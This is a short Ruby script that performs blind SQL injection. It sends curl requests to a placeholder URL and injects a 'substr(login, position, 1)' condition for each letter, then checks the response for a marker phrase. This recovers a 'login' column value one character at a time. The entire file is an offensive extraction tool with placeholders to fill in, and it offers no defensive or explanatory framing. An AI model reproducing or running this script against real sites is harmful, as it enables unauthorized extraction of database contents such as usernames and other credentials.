page_to_sql = 'http://example.com/index.php?id='
wrong_phrase = "INSERT_WRONG_PHRASE"
right_phrase = "INSERT_RIGHT_PHRASE"
num_letters = 10

res = ''
rep = 0
for j in(0..num_letters)
  rep = 1
  for i in('a'..'z')
    if rep==0 
    	break
    end
      req = `curl -s "#{page_to_sql}30 and substr(login,#{j.to_s},1)='#{i}'#"`  #example of sql query
		if req.include? right_phrase
			print "#{j.to_s}=#{i}; "
        	res << i
        	rep = 0
      else if i=='z'
          printf "NO; "
          res << "_#{j.to_s}_"
        end
      end
  end
end
puts
puts res